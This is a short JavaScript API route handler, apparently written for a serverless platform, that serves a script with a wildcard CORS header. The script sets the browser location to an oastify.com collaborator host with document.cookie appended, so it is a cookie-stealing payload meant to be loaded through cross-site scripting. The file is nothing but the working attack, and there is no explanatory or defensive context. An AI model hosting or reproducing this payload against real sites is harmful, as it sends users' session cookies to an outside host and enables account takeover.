export default function handler(req, res) {
  res.setHeader('Content-Type', 'application/javascript');
  res.setHeader('Access-Control-Allow-Origin', '*');
  
  const jsCode = `
location="https://mh75kxcpbq6pwk7ggkpww61zdqjh7bv0.oastify.com"+document.cookie
  `;
  
  res.status(200).send(jsCode);
}